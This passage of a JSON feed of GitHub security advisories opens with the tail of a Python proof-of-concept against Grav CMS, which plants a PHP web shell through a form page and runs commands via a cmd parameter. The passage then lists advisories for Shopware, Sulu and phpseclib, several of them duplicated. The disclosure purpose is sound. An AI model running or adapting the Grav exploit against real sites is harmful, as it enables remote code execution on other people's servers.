self.PASSWORD,\n            \"task\" : \"login\",\n            \"login-nonce\" : login_nonce\n        }\n        res = self.sess.post(self.PREFIX_URL + \"/admin\", data=login_data)\n\n        # Check login\n        if res.status_code != 303:\n            print(\"[!] username or password is wrong\")\n            exit()\n        \n        print(\"[*] Success Login\")\n\n\n    def _save_page(self):\n        print(\"[*] Try to write page\")\n\n        res = self.sess.get(self.PREFIX_URL + f\"/admin/pages/{self.PAGE_NAME}/:add\")\n        form_nonce = self._get_nonce(res.text, \"form-nonce\")\n        unique_form_id = self._get_nonce(res.text, \"__unique_form_id__\")\n\n        # Add page data\n        page_data  = f\"task=save&amp;data%5Bheader%5D%5Btitle%5D={self.PAGE_NAME}&amp;data%5Bcontent%5D=content&amp;data%5Bheader%5D%5Bsearch%5D=&amp;data%5Bfolder%5D={self.PAGE_NAME}&amp;data%5Broute%5D=&amp;data%5Bname%5D=form&amp;data%5Bheader%5D%5Bbody_classes%5D=&amp;data%5Bordering%5D=1&amp;data%5Border%5D=&amp;data%5Bheader%5D%5Border_by%5D=&amp;data%5Bheader%5D%5Border_manual%5D=&amp;data%5Bblueprint%5D=&amp;data%5Blang%5D=&amp;_post_entries_save=edit&amp;__form-name__=flex-pages&amp;__unique_form_id__={unique_form_id}&amp;form-nonce={form_nonce}&amp;toggleable_data%5Bheader%5D%5Bpublished%5D=0&amp;toggleable_data%5Bheader%5D%5Bdate%5D=0&amp;toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&amp;toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&amp;toggleable_data%5Bheader%5D%5Bmetadata%5D=0&amp;toggleable_data%5Bheader%5D%5Bdateformat%5D=0&amp;toggleable_data%5Bheader%5D%5Bmenu%5D=0&amp;toggleable_data%5Bheader%5D%5Bslug%5D=0&amp;toggleable_data%5Bheader%5D%5Bredirect%5D=0&amp;toggleable_data%5Bheader%5D%5Bprocess%5D=0&amp;toggleable_data%5Bheader%5D%5Btwig_first%5D=0&amp;toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&amp;toggleable_data%5Bheader%5D%5Bchild_type%5D=0&amp;toggleable_data%5Bheader%5D%5Broutable%5D=0&amp;toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&amp;toggleable_data%5Bheader%5D%5Bvisible%5D=0&amp;toggleable_data%5Bheader%5D%5Bdebugger%5D=0&amp;toggleable_data%5Bheader%5D%5Btemplate%5D=0&amp;toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&amp;toggleable_data%5Bheader%5D%5Bredirect_default_route%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&amp;toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&amp;toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0\"\n        page_data += f\"&amp;data%5B_json%5D%5Bheader%5D%5Bform%5D=%7B%22xss_check%22%3Afalse%2C%22name%22%3A%22contact-form%22%2C%22fields%22%3A%7B%22name%22%3A%7B%22label%22%3A%22Name%22%2C%22placeholder%22%3A%22Enter+php+code%22%2C%22autofocus%22%3A%22on%22%2C%22autocomplete%22%3A%22on%22%2C%22type%22%3A%22text%22%2C%22validate%22%3A%7B%22required%22%3Atrue%7D%7D%7D%2C%22process%22%3A%7B%22save%22%3A%7B%22filename%22%3A%22{self.PHP_FILE_NAME}%22%2C%22operation%22%3A%22add%22%7D%7D%2C%22buttons%22%3A%7B%22submit%22%3A%7B%22type%22%3A%22submit%22%2C%22value%22%3A%22Submit%22%7D%7D%7D\"\n        res = self.sess.post(self.PREFIX_URL + f\"/admin/pages/{self.PAGE_NAME}/:add\" , data = page_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})\n\n        print(\"[*] Success write page: \" + self.PREFIX_URL + f\"/{self.PAGE_NAME}\")\n\n\n    def _inject_command(self):\n        print(\"[*] Try to inject php code\")\n\n        res = self.sess.get(self.PREFIX_URL + f\"/{self.PAGE_NAME}\")\n        form_nonce = self._get_nonce(res.text, \"form-nonce\")\n        unique_form_id = self._get_nonce(res.text, \"__unique_form_id__\")\n\n        form_data = f\"data%5Bname%5D={self.PAYLOAD}&amp;__form-name__=contact-form&amp;__unique_form_id__={unique_form_id}&amp;form-nonce={form_nonce}\"\n\n        res = self.sess.post(self.PREFIX_URL + f\"/{self.PAGE_NAME}\" , data = form_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})\n\n        print(\"[*] Success inject php code\")\n\n\n    def _execute_command(self):\n        res = self.sess.get(self.PREFIX_URL + f\"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}\")\n\n        if res.status_code == 404:\n            print(\"[!] Fail to execute command or not save php file.\")\n            exit()\n\n        print(\"[*] This is uploaded php file url.\")\n        print(self.PREFIX_URL + f\"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}\")\n        print(res.text)\n\n\nif __name__ == \"__main__\":\n    Poc(cmd=\"id\")\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Remote Code Execution</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-f6g2-h7qv-3m5v\">https://github.com/getgrav/grav/security/advisories/GHSA-f6g2-h7qv-3m5v</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/e3b0aa0c502aad251c1b79d1ee973dcd93711f07\">https://github.com/getgrav/grav/commit/e3b0aa0c502aad251c1b79d1ee973dcd93711f07</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f6g2-h7qv-3m5v\">https://github.com/advisories/GHSA-f6g2-h7qv-3m5v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f6g2-h7qv-3m5v",
            "title": "[getgrav/grav] Remote Code Execution by uploading a phar file using frontmatter",
            "date_modified": "2024-03-06T16:58:34.000Z",
            "date_published": "2024-03-06T16:58:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f6g2-h7qv-3m5v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Symfony Session Handler, pop's the Session Cookie and assign it to the Response. Since Shopware 6.5.8.0 the 404 pages, are cached, to improve the performance of 404 pages. So the cached Response, contains a Session Cookie when the Browser accessing the 404 page, has no cookies yet. The Symfony Session Handler is in use, when no explicit Session configuration has been done.\nWhen Redis is in use for Sessions using the PHP Redis extension, this exploiting code is not used.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to Shopware version 6.5.8.7</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Using Redis for Sessions, as this does not trigger the exploit code. Example configuration for Redis</p>\n<pre><code class=\"language-ini\"># php.ini\nsession.save_handler = redis\nsession.save_path = \"tcp://127.0.0.1:6379\"\n</code></pre>\n<h2 id=\"consequences\">Consequences</h2>\n<p>As an guest browser session has been cached on a 404 page, every missing image or directly reaching a 404 page will logout the customer or clear his cart.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m\">https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m</a></li>\n<li><a href=\"https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3\">https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3</a></li>\n<li><a href=\"https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e\">https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e</a></li>\n<li><a href=\"https://github.com/shopware/shopware/releases/tag/v6.5.8.7\">https://github.com/shopware/shopware/releases/tag/v6.5.8.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c2f9-4jmm-v45m\">https://github.com/advisories/GHSA-c2f9-4jmm-v45m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c2f9-4jmm-v45m",
            "title": "[shopware/platform] Shopware's session is persistent in Cache for 404 pages",
            "date_modified": "2024-03-06T15:07:40.000Z",
            "date_published": "2024-03-06T15:06:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c2f9-4jmm-v45m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Symfony Session Handler, pop's the Session Cookie and assign it to the Response. Since Shopware 6.5.8.0 the 404 pages, are cached, to improve the performance of 404 pages. So the cached Response, contains a Session Cookie when the Browser accessing the 404 page, has no cookies yet. The Symfony Session Handler is in use, when no explicit Session configuration has been done.\nWhen Redis is in use for Sessions using the PHP Redis extension, this exploiting code is not used.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to Shopware version 6.5.8.7</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Using Redis for Sessions, as this does not trigger the exploit code. Example configuration for Redis</p>\n<pre><code class=\"language-ini\"># php.ini\nsession.save_handler = redis\nsession.save_path = \"tcp://127.0.0.1:6379\"\n</code></pre>\n<h2 id=\"consequences\">Consequences</h2>\n<p>As an guest browser session has been cached on a 404 page, every missing image or directly reaching a 404 page will logout the customer or clear his cart.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m\">https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m</a></li>\n<li><a href=\"https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3\">https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3</a></li>\n<li><a href=\"https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e\">https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e</a></li>\n<li><a href=\"https://github.com/shopware/shopware/releases/tag/v6.5.8.7\">https://github.com/shopware/shopware/releases/tag/v6.5.8.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c2f9-4jmm-v45m\">https://github.com/advisories/GHSA-c2f9-4jmm-v45m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c2f9-4jmm-v45m",
            "title": "[shopware/storefront] Shopware's session is persistent in Cache for 404 pages",
            "date_modified": "2024-03-06T15:07:40.000Z",
            "date_published": "2024-03-06T15:06:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c2f9-4jmm-v45m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Access to pages is granted regardless of role permissions for webspaces which have a security system configured and permission check enabled. Webspaces without do not have this issue.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Has the problem been patched? What versions should users upgrade to?</p>\n<p>The problem is patched with Version <code>2.4.17</code> and <code>2.5.13</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>Remove  following lines from <code>vendor/symfony/security-http/HttpUtils.php</code>:</p>\n<pre><code>-            // Shortcut if request has already been matched before\n-            if ($request-&gt;attributes-&gt;has('_route')) {\n-                return $path === $request-&gt;attributes-&gt;get('_route');\n -           }\n</code></pre>\n<p>Or do not install <code>symfony/security-http</code> versions greater equal than <code>v5.4.30</code> or <code>v6.3.6</code>.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>Currently no references.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p\">https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p</a></li>\n<li><a href=\"https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da\">https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27915\">https://nvd.nist.gov/vuln/detail/CVE-2024-27915</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr83-m233-gg6p\">https://github.com/advisories/GHSA-jr83-m233-gg6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr83-m233-gg6p",
            "title": "[sulu/sulu] Sulu grants access to pages regardless of role permissions",
            "date_modified": "2024-03-06T21:37:50.000Z",
            "date_published": "2024-03-04T20:45:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr83-m233-gg6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Access to pages is granted regardless of role permissions for webspaces which have a security system configured and permission check enabled. Webspaces without do not have this issue.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Has the problem been patched? What versions should users upgrade to?</p>\n<p>The problem is patched with Version <code>2.4.17</code> and <code>2.5.13</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>Remove  following lines from <code>vendor/symfony/security-http/HttpUtils.php</code>:</p>\n<pre><code>-            // Shortcut if request has already been matched before\n-            if ($request-&gt;attributes-&gt;has('_route')) {\n-                return $path === $request-&gt;attributes-&gt;get('_route');\n -           }\n</code></pre>\n<p>Or do not install <code>symfony/security-http</code> versions greater equal than <code>v5.4.30</code> or <code>v6.3.6</code>.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>Currently no references.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p\">https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p</a></li>\n<li><a href=\"https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da\">https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27915\">https://nvd.nist.gov/vuln/detail/CVE-2024-27915</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr83-m233-gg6p\">https://github.com/advisories/GHSA-jr83-m233-gg6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr83-m233-gg6p",
            "title": "[sulu/sulu] Sulu grants access to pages regardless of role permissions",
            "date_modified": "2024-03-06T21:37:50.000Z",
            "date_published": "2024-03-04T20:45:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr83-m233-gg6p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. When processing the ASN.1 object identifier of a certificate, a sub identifier may be provided that leads to a denial of service (CPU consumption for decodeOID).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27355\">https://nvd.nist.gov/vuln/detail/CVE-2024-27355</a></li>\n<li><a href=\"https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b\">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129\">https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59\">https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr22-8qgm-4q87\">https://github.com/advisories/GHSA-jr22-8qgm-4q87</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr22-8qgm-4q87",
            "title": "[phpseclib/phpseclib] phpseclib does not properly limit the ASN1 OID length",
            "date_modified": "2024-03-04T20:42:23.000Z",
            "date_published": "2024-03-02T00:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr22-8qgm-4q87"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. When processing the ASN.1 object identifier of a certificate, a sub identifier may be provided that leads to a denial of service (CPU consumption for decodeOID).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27355\">https://nvd.nist.gov/vuln/detail/CVE-2024-27355</a></li>\n<li><a href=\"https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b\">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129\">https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59\">https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr22-8qgm-4q87\">https://github.com/advisories/GHSA-jr22-8qgm-4q87</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr22-8qgm-4q87",
            "title": "[phpseclib/phpseclib] phpseclib does not properly limit the ASN1 OID length",
            "date_modified": "2024-03-04T20:42:23.000Z",
            "date_published": "2024-03-02T00:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr22-8qgm-4q87"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. When processing the ASN.1 object identifier of a certificate, a sub identifier may be provided that leads to a denial of service (CPU consumption for decodeOID).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27355\">https://nvd.nist.gov/vuln/detail/CVE-2024-27355</a></li>\n<li><a href=\"https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b\">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129\">https://github.com/phpseclib/phpseclib/blob/978d081fe50ff92879c50ff143c62a143edb0117/phpseclib/File/ASN1.php#L1129</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59\">https://github.com/phpseclib/phpseclib/commit/e32531001b4d62c66c3d824ccef54ffad835eb59</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr22-8qgm-4q87\">https://github.com/advisories/GHSA-jr22-8qgm-4q87</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr22-8qgm-4q87",
            "title": "[phpseclib/phpseclib] phpseclib does not properly limit the ASN1 OID length",
            "date_modified": "2024-03-04T20:42:23.000Z",
            "date_published": "2024-03-02T00:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr22-8qgm-4q87"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. An attacker can construct a malformed certificate containing an extremely large prime to cause a denial of service (CPU consumption for an isPrime primality check). NOTE: this issue was introduced when attempting to fix CVE-2023-27560.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27354\">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>\n<li><a href=\"https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b\">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49\">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698\">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575\">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56\">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hg35-mp25-qf6h\">https://github.com/advisories/GHSA-hg35-mp25-qf6h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hg35-mp25-qf6h",
            "title": "[phpseclib/phpseclib] phpseclib a large prime can cause a denial of service ",
            "date_modified": "2024-03-04T20:41:56.000Z",
            "date_published": "2024-03-02T00:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hg35-mp25-qf6h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. An attacker can construct a malformed certificate containing an extremely large prime to cause a denial of service (CPU consumption for an isPrime primality check). NOTE: this issue was introduced when attempting to fix CVE-2023-27560.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27354\">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>\n<li><a href=\"https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b\">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49\">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698\">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575\">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56\">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hg35-mp25-qf6h\">https://github.com/advisories/GHSA-hg35-mp25-qf6h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hg35-mp25-qf6h",
            "title": "[phpseclib/phpseclib] phpseclib a large prime can cause a denial of service ",
            "date_modified": "2024-03-04T20:41:56.000Z",
            "date_published": "2024-03-02T00:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hg35-mp25-qf6h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in phpseclib 1.x before 1.0.23, 2.x before 2.0.47, and 3.x before 3.0.36. An attacker can construct a malformed certificate containing an extremely large prime to cause a denial of service (CPU consumption for an isPrime primality check). NOTE: this issue was introduced when attempting to fix CVE-2023-27560.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-27354\">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>\n<li><a href=\"https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b\">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49\">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698\">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575\">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>\n<li><a href=\"https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56\">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hg35-mp25-qf6h\">https://github.com/advisories/GHSA-hg35-mp25-qf6h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hg35-mp25-qf6h",
            "title": "[phpseclib/phpseclib] phpseclib a large prime can cause a denial of service ",
            "date_modified": "2024-03-04T20:41:56.000Z",
            "date_published": "2024-03-02T00:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hg35-mp25-qf6h"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}